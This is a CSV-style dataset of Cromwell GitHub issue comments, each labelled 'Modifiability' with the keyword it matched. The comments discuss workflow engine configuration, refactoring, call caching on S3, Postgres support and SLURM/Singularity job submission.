Modifiability,"Ready for review, satisfies A/C of:. 1. Process subworkflows separately from their parents (`IncludeSubworkflows.name -> ""true""`); 2. Start at the very oldest workflows (`NewestFirst.name -> ""false""`); 3. Allow for a “not before” time in configuration (`archiveDelay`, `deleteDelay`). ( The last A/C involving the config seems to have already been addressed on `dev` of `firecloud-develop` )",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6230#issuecomment-807456524:238,config,configuration,238,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6230#issuecomment-807456524,2,['config'],"['config', 'configuration']"
Modifiability,"Realized I had more logs that might be helpful from what we saw in one of the workflows that failed. This is a task that is pre-emptible; ```; 2016-12-08 16:14:28,581 cromwell-system-akka.dispatchers.engine-dispatcher-145 WARN - WorkflowExecutionActor-0545f731-803b-4194-a74e-44cc5c208ce4 [UUID(0545f731)]: Job PairedEndSingleSampleWorkflow.SamToFastqAndBwaMem:5:1 failed with a retryable failure: cromwell.core.package$CromwellFatalException: com.google.api.client.googleapis.json.GoogleJsonResponseException: 429 Too Many Requests; {; ""code"" : 429,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Insufficient tokens for quota group and limit 'defaultUSER-100s' of service 'staging-genomics.sandbox.googleapis.com', using the limit by ID '628662467800@1088569555438'."",; ""reason"" : ""rateLimitExceeded""; } ],; ""message"" : ""Insufficient tokens for quota group and limit 'defaultUSER-100s' of service 'staging-genomics.sandbox.googleapis.com', using the limit by ID '628662467800@1088569555438'."",; ""status"" : ""RESOURCE_EXHAUSTED""; }; 2016-12-08 16:14:28,581 cromwell-system-akka.dispatchers.engine-dispatcher-145 INFO - WorkflowExecutionActor-0545f731-803b-4194-a74e-44cc5c208ce4 [UUID(0545f731)]: Retrying job execution for PairedEndSingleSampleWorkflow.SamToFastqAndBwaMem:5:2; 2016-12-08 16:14:28,585 cromwell-system-akka.dispatchers.engine-dispatcher-145 INFO - WorkflowExecutionActor-0545f731-803b-4194-a74e-44cc5c208ce4 [UUID(0545f731)]: Starting calls: PairedEndSingleSampleWorkflow.SamToFastqAndBwaMem:5:2; ```. and this is one that was not pre-emptible(is my guess based on metadata from the workflow, only one task is ""failed"" in that workflow); ```; 2016-12-08 16:14:36,602 cromwell-system-akka.dispatchers.engine-dispatcher-289 ERROR - WorkflowManagerActor Workflow 0545f731-803b-4194-a74e-44cc5c208ce4 failed (during ExecutingWorkflowState): cromwell.core.package$CromwellFatalException: cromwell.core.package$CromwellFatalException: com.google.api.client.googleapis.json.GoogleJsonRe",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1763#issuecomment-271640490:697,sandbox,sandbox,697,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1763#issuecomment-271640490,2,['sandbox'],['sandbox']
Modifiability,Rebased on develop (fixed merge now that the other PRs are in) and cleaned up the environment vars (DRYer + variable name change).,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3915#issuecomment-407929014:108,variab,variable,108,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3915#issuecomment-407929014,1,['variab'],['variable']
Modifiability,Red thumb required because I refactored the `size` function in `IoFunctionSet` in `cromwell.backend`. Previously it was implementing a bunch of parameter parsing and implementing the WDL Draft 2 semantics. Now it tells you the size of a file and the language versions implement the semantics around that.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3439#issuecomment-374730690:29,refactor,refactored,29,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3439#issuecomment-374730690,1,['refactor'],['refactored']
Modifiability,"Regarding Kris' comment, I'm game for removing features in general, including ""user"". Various optional tests will need some help though, as currently they use user credentials. They instead should switch to the service account. The application-default factory seemed to return a credential on our Travis, though I haven't yet investigated what that credential actually is. I'm also willing to see ""application-default"" be the GoogleCredentialFactory implicit default. Still, I understand if others vote for the config to be explicit, in which case I like the suggested name ""default"". I'll stand down on making changes for now while @mcovarr has the ticket. Will still look for docs on scopes though.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/338#issuecomment-166473338:511,config,config,511,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/338#issuecomment-166473338,1,['config'],['config']
Modifiability,"Remember, @Horneth's first thought is always correct. 😄 . I think the code is fine as it is, plus the author gets the edge anyway. If there gets to be more complexity here this could certainly be refactored to use a separate actor, but I don't think a separate actor is warranted given the current situation.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/818#issuecomment-218602712:196,refactor,refactored,196,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/818#issuecomment-218602712,1,['refactor'],['refactored']
Modifiability,Results from running this again with proper configuration: 75m down to 25. The entire run on the correct configuration appears to line up with the initial plateau from the `develop` results,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5518#issuecomment-632253441:44,config,configuration,44,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5518#issuecomment-632253441,2,['config'],['configuration']
Modifiability,Reviewer note: I recommend reviewing commit-by-commit so that the actual bug fix stands out from the larger refactor.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6118#issuecomment-738344034:108,refactor,refactor,108,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6118#issuecomment-738344034,1,['refactor'],['refactor']
Modifiability,"Right I just meant that in the tests the ratio (DB access / executedCode) may be higher compared to ""normal execution"" where we spend a lot of time waiting for calls to end. But yes production will definitely not be an easier environment than tests :); I kinda like the DataAccess actor option, although I think slick already manages its own pool of threads and everything, so maybe just by tweaking some configuration we could improve performance before going full Super Saiyan Actor Scaling mode.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/198#issuecomment-143037444:405,config,configuration,405,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/198#issuecomment-143037444,1,['config'],['configuration']
Modifiability,"Right, I think @cjllanwarne is correct here (although he might have biased me). The request is to make sure `isAlive` is only ever called during the polling if the user has configured Cromwell to allow it",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4112#issuecomment-424421758:173,config,configured,173,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4112#issuecomment-424421758,1,['config'],['configured']
Modifiability,"Right. So it sounds like this is an issue with disk space on the PAPI worker. Since I'm using the official Broad pipelines, the way to configure this is with the `flowcell_medium_disk` input field to the `PreProcessingForVariantDiscovery_GATK4` workflow",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4337#issuecomment-434525496:135,config,configure,135,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4337#issuecomment-434525496,1,['config'],['configure']
Modifiability,"Running into this problem again today. Having true modularity would be nice. So I can make a workflow, that imports a workflow, that imports a workflow. Imports need to be evaluated at the file level to handle this. ; This could be set as a config option to not break backwards compatibility.; I have some experience in scala myself as most of the tools in our institute are programmed in scala as well. If given some pointers I could maybe help in implementing this?. Am I correct in thinking that imports are evaluated [here](https://github.com/broadinstitute/cromwell/blob/develop/wdl/model/draft2/src/main/scala/wdl/draft2/model/Import.scala)?; Default configuration is in [here](https://github.com/broadinstitute/cromwell/blob/2cd38db0eb818b07ad38463183fe7a8af4706899/core/src/main/resources/reference.conf) right? Can I just add a new key,value pair which I can call from `import.scala` or are some changes to a code file required?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3241#issuecomment-366954601:241,config,config,241,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3241#issuecomment-366954601,2,['config'],"['config', 'configuration']"
Modifiability,"S_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1. EJEA attempted to copy 1 cache hits before failing. Of these 1 failed to copy and 0 were already blacklisted from previous attempts). Falling back to running job. As you can see, some small tasks worked but large tasks failed. > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > […](#); > On Sat, Oct 24, 2020 at 8:27 PM Luyu ***@***.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub <#5977>, or unsubscribe <https://github.com/notifications/unsubscribe-",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807:2795,config,config,2795,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807,1,['config'],['config']
Modifiability,Sample output:; ```; Caused by: lenthall.exception.AggregatedException: :; Variable is resolved to scope subworkflow.subwf.is but cannot be evaluated.; 	at lenthall.util.TryUtil$.sequenceIterable(TryUtil.scala:26); 	at lenthall.util.TryUtil$.sequence(TryUtil.scala:33); 	at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor.cromwell$engine$workflow$lifecycle$execution$WorkflowExecutionActor$$startRunnableScopes(WorkflowExecutionActor.scala:364); 	... 22 more; 	Suppressed: wdl4s.exception.VariableLookupException: Variable is resolved to scope subworkflow.subwf.is but cannot be evaluated.; 		at wdl4s.Scope$$anonfun$5.apply(Scope.scala:255); 		at wdl4s.Scope$$anonfun$5.apply(Scope.scala:246); 		at scala.Option.map(Option.scala:146); 		at wdl4s.Scope$class.lookup$1(Scope.scala:246); 		at wdl4s.Scope$$anonfun$lookupFunction$1.apply(Scope.scala:263); 		at wdl4s.Scope$$anonfun$lookupFunction$1.apply(Scope.scala:263); 		at wdl4s.expression.ValueEvaluator$$anonfun$evaluate$1.apply(ValueEvaluator.scala:45); 		at wdl4s.expression.ValueEvaluator$$anonfun$evaluate$1.apply(ValueEvaluator.scala:45); ```,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1785#issuecomment-267361485:75,Variab,Variable,75,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1785#issuecomment-267361485,3,['Variab'],"['Variable', 'VariableLookupException']"
Modifiability,Scratch that. Fresh git clone and build cleared the error for the non-AWS config. I must have screwed up the switch to develop from aws_backend branch. So my error **does** seem to be related to AWS code somehow! Sorry for the whipsaw...,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395489025:74,config,config,74,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395489025,1,['config'],['config']
Modifiability,"Server mode is the intended, first-class usage scenario for Cromwell. It's really [no harder to use](https://cromwell.readthedocs.io/en/stable/tutorials/ServerMode/) than run mode and enables way more features. Run mode is in maintenance and we do not anticipate making enhancements.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5451#issuecomment-785281065:270,enhance,enhancements,270,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5451#issuecomment-785281065,1,['enhance'],['enhancements']
Modifiability,Should we just rewrite the hash / equals methods in the Scope trait ?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1602#issuecomment-254944647:15,rewrite,rewrite,15,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1602#issuecomment-254944647,1,['rewrite'],['rewrite']
Modifiability,"Side note for those **only** looking to put time limits on commands, and **not** looking for a workaround for cloud bugs-- here's a more-portable time limit option: `timeout`. `timeout` differs slightly in each distro. Example docs:; - https://busybox.net/downloads/BusyBox.html#timeout; - https://www.gnu.org/software/coreutils/manual/html_node/timeout-invocation.html; - https://manpages.debian.org/stretch/coreutils/timeout.1.en.html. The command `timeout` will most likely be unable to help for ""stuck"" cloud jobs. For example, if the command `echo hello world` actually exits but for some unknown reason the cloud VM sticks around forever, then `timeout 5s echo hello world` will likely have the same issue.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4946#issuecomment-490059717:137,portab,portable,137,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4946#issuecomment-490059717,1,['portab'],['portable']
Modifiability,Simple workaround - add the following block into the configuration file:. ```; system {; job-rate-control {; jobs = 1; per = 1 second; }; }; ```. Drastically improved the situation for me,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-442274340:53,config,configuration,53,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-442274340,1,['config'],['configuration']
Modifiability,"Since it's been a month I thought I'd post an update. Main items:; - In general I'm having to make a lot more changes to the Scala code than I expected due to queries being written in a way that Postgres doesn't like. (This isn't a criticism, more of a heads-up.) Nothing functional, just refactoring.; - The way `Blob` is handled in Slick+Postgres turns out to be a massive pain. I'm not sure if Slick is lazy-loading these fields or I just don't understand how it works under the hood, but the workaround is that the blobs need to be accessed as part of a transaction, which involved some refactoring of downstream processing.; - Semi-related question: is there a reason why the entire contents of the `importsZip` need to be stored in the database? This quickly leads to an enormous METADATA_ENTRY table - possibly because I have call caching turned on, I haven't checked whether this is the cause yet.; - The auto-incremented fields that are `Option[Long]` in the data model can't be handled the same way in Postgres; I haven't decided whether this is simply different database behavior or a bug somewhere. Anyway I found a workaround for that too.; - I may have messed up and branched from `master` in my fork by mistake, and in any case I'm definitely out of sync with your `develop`. Do you have a preferred workflow to bring my branch up to date, i.e. to minimize the mess in the Git history? (Despite using Git daily I'm still not totally sure what ""best practice"" is.). At this point I can at least run a workflow using Postgres, minus call caching. I'm going to be focusing on completing and testing this in the next couple of weeks.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4759#issuecomment-486370402:289,refactor,refactoring,289,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4759#issuecomment-486370402,2,['refactor'],['refactoring']
Modifiability,"Singularity would require changes to the cromwell configuration file, correct? Since the docker command would change. Probably not hard, but would need documentation.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1832#issuecomment-423179922:50,config,configuration,50,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1832#issuecomment-423179922,1,['config'],['configuration']
Modifiability,"So I did some digging. The bad news: a `docker_pull` command will not work. It cannot be implemented at workflow initialization because at that point in time runtime attributes are not known. These are evaluated when the task is executed. This is due to inputs in WDL being dependent on the outputs of other tasks, which is what makes WDL great, so this cannot (easily) be fixed. So a docker_pull command would have to be executed at task execution time. But then it is redundant. This command can be part of the submit script. . Thanks @TMiguelT for suggesting flock. Together with `singularity exec` I think it can solve this particular use case. The `SINGULARITY_CACHEDIR` environment variable needs to be set to a location on the cluster. Then the following config can work:. ```; SLURM {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; concurrent-job-limit = 200; exit-code-timeout-seconds = 120; # 4G Memory by default; runtime-attributes= """"""; Int cpu = 1; Int? memory; String? docker; Int time_minutes = 120; """"""; submit-docker = """"""; # Singularity pull image. ; if [ -z $SINGULARITY_CACHEDIR ]; ; then CACHE_DIR=$HOME/singularity/cache; else CACHE_DIR=$SINGULARITY_CACHEDIR; fi; mkdir -p $CACHE_DIR; LOCK_FILE=$CACHE_DIR/singularity_pull_flock; # flock should work as this is executed at the same node as cromwell.; flock --verbose --exclusive --timeout 900 $LOCK_FILE singularity exec --containall docker://${docker} echo ""succesfully pulled ${docker}!"". # Partition selection; PARTITION=all; MEMORY=${default=""4294967296"" memory}; if [ ${time_minutes} -lt 60 ]; then PARTITION=short; fi; if [ $MEMORY -gt 107374182400 ] ; then PARTITION=highmem ; fi. # Job submission; sbatch \; --partition=$PARTITION \; --job-name=""${job_name}"" \; --chdir=""${cwd}"" \; --time=""${time_minutes}"" \; --cpus-per-task=""${cpu}"" \; --mem=$(echo ""$MEMORY / 1024^2"" | bc) \; --output=""${out}"" \; --error=""${err}"" \; --wrap \; 'singularity exec --containall --bind /",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-627379430:688,variab,variable,688,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-627379430,5,"['Config', 'config', 'variab']","['ConfigBackendLifecycleActorFactory', 'config', 'variable']"
Modifiability,"So I moved the http{} stanza to the correct place in the cromwell_cori.conf file (it was there but in the wrong place). And I changed Local to Mylocal in lines 22 & 26 in the config file. I used this command ; ```; export _JAVA_OPTIONS=""--add-opens=java.base/sun.security.util=ALL-UNNAMED"". java -Dconfig.file=cromwell_docker.conf; -Dbackend.providers.MyLocal.config.dockerRoot=$(pwd)/cromwell-executions; -Dbackend.providers.MyLocal.config.root=$(pwd)/cromwell-executions; -jar ~/cromwell/cromwell-84.jar run fq_count.wdl -i fq_count.json; ```; (Note the change from Local to Mylocal in the command). This command should fail with the ""Could not build the path"" error. Would you please try again with this new cromwell_docker.conf file and new command?. [test-files.zip](https://github.com/broadinstitute/cromwell/files/10397528/test-files.zip)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6977#issuecomment-1379722692:175,config,config,175,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6977#issuecomment-1379722692,3,['config'],['config']
Modifiability,"So I tested that this will now correctly fail a workflow, and indeed:; ```; ERROR - WorkflowManagerActor Workflow f587f57a-2897-4450-a4e1-410442f2460c failed (during ExecutingWorkflowState): Variable 'xs' not found; wdl4s.exception.VariableNotFoundException$$anon$1: Variable 'xs' not found; ```. However as noted, this is a Cromwell runtime catch. It'd be much nicer as a WDL4S validation.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1774#issuecomment-298086885:191,Variab,Variable,191,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1774#issuecomment-298086885,3,['Variab'],"['Variable', 'VariableNotFoundException']"
Modifiability,"So I think I'm now clear regarding the options on this thread. One option, and the original one discussed, is a container entrypoint (""Orchestrator"" as @danbills put it). Another option, which is what I originally thought was being discussed, is an always-running sidecar. That entrypoint container would then launch our target container, similar to something like https://ohsu-comp-bio.github.io/funnel/ or https://github.com/delagoya/batch-task-runner. IMHO, the entrypoint/Orchestrator introduces some unnecessary complexity. It works for a simple case, but leaves a lot of configuration as TBD. To implement this properly we'd need to implement a standard task definition for the entrypoint (or Orchestrator) container (simple), but also pass to that container all the necessary docker parameters necessary for implementing the target container (much more difficult). There is also the question of supervision for the target container as the entrypoint/Orchestrator is hiding from batch and Cromwell the actual task's status. Also, the permissions issues I brought up in my comment above apply. I also have some concerns about the implementation of this approach within Cromwell, as I believe (but I'm not certain), this scheme would require some non-trivial changes to the StandardAsyncExecutionActor class as well as the AwsBatchAsyncExecutionActor logic (likely moreso on the later). I haven't investigated, but I also have some concerns over whether this mechanism would require significant rework of the process input/output and return code. It looks like @delagoya may have considered this in the batch-task-runner repo, but I'm not clear on this after the limited time I've had reviewing the repo. So, with that in mind, I spent a bit of time researching the ""always on sidecar"" approach, which I'll reference as ""cromwell agent"" moving forward for clarity. I took a look at the limitations of the permissions issue I mentioned above, and I believe I have a workable solution. The high leve",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3804#issuecomment-405738068:577,config,configuration,577,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3804#issuecomment-405738068,1,['config'],['configuration']
Modifiability,"So I've run across into an even more explicit scenario where File? probably should be accepted (or coerced). This doesn't work:. `String? tsv_arg = if defined(tsv_file_input) then basename(tsv_file_input) else """"`. basename() is only going to be run if File? tsv_file_input is defined. Wouldn't it make sense for that if-block to effectively coerce the File? into a File in the context of the then-block? Generally speaking when I write a program that says ""if variable is defined, do something with variable"" to just work, rather than throwing an error when the variable isn't defined, much less throwing an error when the variable might not be defined (which is what appears to be happening here).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1239868895:461,variab,variable,461,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1239868895,4,['variab'],['variable']
Modifiability,"So if I understood correctly, I believe the issue is you need to specify `zones` properly in your `runtime` block. The default value is `us-east-1a` which tracks with what you're seeing. Cromwell does not (AFAICT) look at `~/.aws/config` for anything",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4974#issuecomment-493251791:230,config,config,230,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4974#issuecomment-493251791,1,['config'],['config']
Modifiability,So it sounds like we're agreed on a config option and _possibly_ disagreed on the default value? :smile: I'm proposing to have `--rm` on by default since I don't think most users will care about it and they'll just needlessly accumulate a pile of containers. ```; air:cromwell joeuser$ java -jar target/scala-2.11/cromwell-0.10.jar -Dbackend.local.docker-run-rm=false run hello.wdl hello.json; ```,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/167#issuecomment-137047641:36,config,config,36,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/167#issuecomment-137047641,1,['config'],['config']
Modifiability,"So sorry for the late response. To the best of my understanding, mysql database is needed to be configured to support the cache function. ; [cromwell_mysql.pdf](https://github.com/broadinstitute/cromwell/files/9853162/cromwell_mysql.pdf)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6484#issuecomment-1289256952:96,config,configured,96,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6484#issuecomment-1289256952,1,['config'],['configured']
Modifiability,"So the gist of how udocker caches things is that it uses a directory similar to Docker, which defaults to [`~/.udocker`](https://github.com/indigo-dc/udocker/blob/master/udocker.py#L137), but you can override that with a config file [described here](https://github.com/indigo-dc/udocker/blob/master/doc/installation_manual.md#9-configuration), to set a custom location, e.g. `reposdir = ""/path/to/cache""`. Within that directory it caches the different layers and images in different subdirectories. I'll write that up into the document.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4635#issuecomment-464521267:221,config,config,221,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4635#issuecomment-464521267,3,"['config', 'layers']","['config', 'configuration', 'layers']"
Modifiability,"So we need an uber api that tracks preemptions across registered Cromwell; servers and then uses machine learning to make predictions of lowest cost; configuration that meets system resources. Simple.... (joke). On Dec 18, 2016 12:39, ""Jeff Gentry"" <notifications@github.com> wrote:. > @pgrosu <https://github.com/pgrosu> IIRC we use central to avoid some of; > their other large customers in other zones. However note that we *are*; > one of their large customers so choosing the same zone as us might not be; > the best plan for success in avoiding preemptions :); >; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/1795#issuecomment-267834836>,; > or mute the thread; > <https://github.com/notifications/unsubscribe-auth/AAFpE0Z7yysmspq1G1F35bUZzr4Cy7wzks5rJW_LgaJpZM4LPeJB>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1795#issuecomment-267836259:150,config,configuration,150,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1795#issuecomment-267836259,1,['config'],['configuration']
Modifiability,"So when users upgrade to this version of Cromwell, they will need to re-configure their Cromwell or they will go back to using Local? That will need to be clearly included in the release notes, changelog, and possibly a blog post so users are less likely to miss the update.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2069#issuecomment-288176961:72,config,configure,72,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2069#issuecomment-288176961,1,['config'],['configure']
Modifiability,"So, for anybody is interested how I do it now. I just parse path to any file produced by the workflow and I extract first Cromwell workflow ID in the path as a root ID. That is a bit of a hack IMHO because it requires the knowledge of the directory structure but it works. I did not put it as an environmental variable because I was afraid cluster space spoilage. EDIT: As I mentioned in previous entry the cash needs to be invalidated for the particular task for this to work and until #1695 is not done (or some other solution is reached) this solution in principle excludes restart.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1575#issuecomment-537826459:310,variab,variable,310,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1575#issuecomment-537826459,1,['variab'],['variable']
Modifiability,"So, quick thoughts on this. +1 on @delagoya's sidecar container concept (with some concerns I'll mention below). When implementing #3835 I had this issue in mind as well, along with some thoughts on implementation. My thought was to have a sidecar always running, using the [system events](https://docs.docker.com/engine/api/v1.37/#operation/SystemEvents) api to monitor for containers that have exited. At that time, it can [inspect the container](https://docs.docker.com/engine/api/v1.37/#operation/ContainerInspect), make sure it's a cromwell container, and use the volume information (in conjunction with the TASK_ID environment variable I'm setting) to find the local files and copy them out to s3. Something to consider that I don't see discussed yet on this thread: A sidecar approach requires the sidecar to have fairly permissive access to S3. On the positive side, this does alleviate the need for S3 permissions on the container running the task.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3804#issuecomment-401398435:633,variab,variable,633,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3804#issuecomment-401398435,1,['variab'],['variable']
Modifiability,Some beast has refactored JesBackend while I was refactoring JesBackend,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/252#issuecomment-150014857:15,refactor,refactored,15,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/252#issuecomment-150014857,2,['refactor'],"['refactored', 'refactoring']"
Modifiability,Some small questions but otherwise looks good to me. I'm assuming [this](https://github.com/broadinstitute/cromwell/blob/e59dd128945ade2abc1ca6c001e76b0128afc5b8/engine/src/main/scala/cromwell/engine/workflow/lifecycle/execution/WorkflowExecutionActor.scala#L406) is going to be enhanced. 👍 . [![Approved with PullApprove](https://img.shields.io/badge/pullapprove-approved-brightgreen.svg)](https://pullapprove.com/broadinstitute/cromwell/pull-request/1779/?utm_source=github-pr&utm_medium=comment-badge&utm_campaign=broadinstitute/cromwell),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1779#issuecomment-267111826:279,enhance,enhanced,279,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1779#issuecomment-267111826,1,['enhance'],['enhanced']
Modifiability,"Someone will need to document the new `defaultBackend` and `backendsAllowed` configuration in the CHANGELOG, and the workflow option `backend` before this can be released. Should I do that?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/609#issuecomment-203068046:77,config,configuration,77,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/609#issuecomment-203068046,1,['config'],['configuration']
